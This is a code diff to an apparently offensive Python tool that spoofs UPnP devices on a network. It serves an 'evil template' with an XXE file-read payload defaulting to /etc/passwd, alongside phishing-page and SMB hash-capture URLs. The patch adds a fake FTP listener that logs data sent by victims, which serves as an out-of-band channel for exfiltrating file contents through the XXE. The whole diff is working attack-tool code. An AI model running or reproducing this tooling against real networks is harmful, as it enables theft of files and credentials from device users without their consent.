@@ -17,7 +17,7 @@ try:
     from multiprocessing import Process
     from string import Template
     from http.server import BaseHTTPRequestHandler, HTTPServer
-    from socketserver import ThreadingMixIn
+    from socketserver import ThreadingMixIn, TCPServer
     from email.utils import formatdate
     from ipaddress import ip_address
     import sys
@@ -29,6 +29,7 @@ try:
     import signal
     import base64
     import random
+    import threading
     from datetime import datetime
 except ImportError:
     print("\nError importing required modules... Are you using Python3?\n"
@@ -54,6 +55,7 @@ if sys.version_info < (3, 0):
     print("\nSorry mate, you'll need to use Python 3+ on this one...\n")
     sys.exit(1)
 
+ftpd = None
 dt_date = datetime.now()
 random_str = dt_date.strftime("%Y-%m-%d-%H-%M-%S-%f")
 
@@ -222,6 +224,7 @@ def build_class(upnp_args):
     local_ip = upnp_args['local_ip']
     local_port = upnp_args['local_port']
     xxe_lfi = upnp_args['xxe_lfi']
+    ftp_port = upnp_args['ftp_port']
 
     class UPNPObject(BaseHTTPRequestHandler):
         """Spoofed UPnP object
@@ -292,7 +295,8 @@ def build_class(upnp_args):
             xxe_tip = re.sub('[^0-9a-zA-Z]+', '.', xxe_lfi)
             variables = {'local_ip': local_ip,
                          'local_port': local_port,
-			 'xxe_lfi': xxe_lfi,
+                         'ftp_port': ftp_port,
+                         'xxe_lfi': xxe_lfi,
                          'xxe_tip': xxe_tip,
                          'random_str': random_str}
             file_in = open(template_dir + '/data.dtd')
@@ -481,6 +485,51 @@ def build_class(upnp_args):
 
     return UPNPObject
 
+class FTPserverThread(threading.Thread):
+    def __init__(self, conn_addr):
+        conn, addr = conn_addr
+        self.conn = conn
+        self.addr = addr
+        threading.Thread.__init__(self)
+
+    def run(self):
+        self.conn.send(str.encode('220 Welcome!\r\n'))
+        while True:
+            data = self.conn.recv(1024)
+            if not data:
+                break
+            else:
+                print(PC.red + "FTP: recvd" +PC.endc + "'%s'" % data.strip().decode("ascii"))
+                if str.encode("LIST") in data:
+                    self.conn.send(str.encode("drwxrwxrwx 1 owner group          1 Feb 21 04:37 test\r\n"))
+                    self.conn.send(str.encode("150 Opening BINARY mode data connection for /bin/ls\r\n"))
+                    self.conn.send(str.encode("226 Transfer complete.\r\n"))
+                elif str.encode("USER") in data:
+                    self.conn.send(str.encode("331 password please\r\n"))
+                elif str.encode("PORT") in data:
+                    self.conn.send(str.encode("200 PORT command ok\r\n"))
+                elif str.encode("RETR") in data:
+                    self.conn.send(str.encode('500 Sorry.\r\n\r\n'))
+                else:
+                    self.conn.send(str.encode("230 more data please!\r\n"))
+
+
+class FTPserver(threading.Thread):
+    def __init__(self, ip, port):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.sock.bind((ip, port))
+        threading.Thread.__init__(self)
+
+    def run(self):
+        self.sock.listen(5)
+        while True:
+            th = FTPserverThread(self.sock.accept())
+            th.daemon = True
+            th.start()
+
+    def stop(self):
+        self.sock.close()
 
 def process_args():
     """Handles user-passed parameters"""
@@ -490,6 +539,9 @@ def process_args():
     parser.add_argument('-p', '--port', type=str, action='store',
                         default=8888,
                         help='Port for HTTP server. Defaults to 8888.')
+    parser.add_argument('-g', '--ftp', type=str, action='store',
+                        default=2121,
+                        help='Port for FTP server. Defaults to 2121.')
     parser.add_argument('-f', '--file', type=str, action='store',
 			default='/etc/passwd',
 			help=('Name of a file for template change'
@@ -591,10 +643,12 @@ def print_details(args, local_ip, smb_server):
         local_ip, args.local_port)
     exfil_url = 'http://{}:{}/ssdp/data.dtd'.format(local_ip, args.local_port)
     smb_url = 'file://///{}/smb/hash.jpg'.format(smb_server)
+    ftp_url = 'ftp://{}:{}/'.format(local_ip, args.ftp)
     print("\n\n")
     print("########################################")
     print(PC.ok_box + "EVIL TEMPLATE:           {}".format(args.template_dir))
     print(PC.ok_box + "MSEARCH LISTENER:        {}".format(args.interface))
+    print(PC.ok_box + "FTP LISTENER:            {}".format(ftp_url))
     print(PC.ok_box + "DEVICE DESCRIPTOR:       {}".format(dev_url))
     print(PC.ok_box + "SERVICE DESCRIPTOR:      {}".format(srv_url))
     print(PC.ok_box + "PHISHING PAGE:           {}".format(phish_url))
@@ -649,6 +703,7 @@ def main():
                  'is_auth':args.is_auth,
                  'local_ip':local_ip,
                  'xxe_lfi':args.file,
+                 'ftp_port':args.ftp,
                  'realm':args.realm,
                  'local_port':args.local_port}
 
@@ -660,6 +715,10 @@ def main():
     print_details(args, local_ip, smb_server)
 
     try:
+        t_ftpd = FTPserver(local_ip,args.ftp)
+        t_ftpd.setDaemon(True)
+        t_ftpd.start()
+        ftpd = t_ftpd
         ssdp_server.start()
         web_server.start()
         signal.pause()
@@ -668,6 +727,10 @@ def main():
               "Thanks for playing! Stopping threads and exiting...\n")
         web_server.terminate()
         ssdp_server.terminate()
+        try:
+            ftpd.stop()
+        except:
+            pass
         sys.exit()
 
 
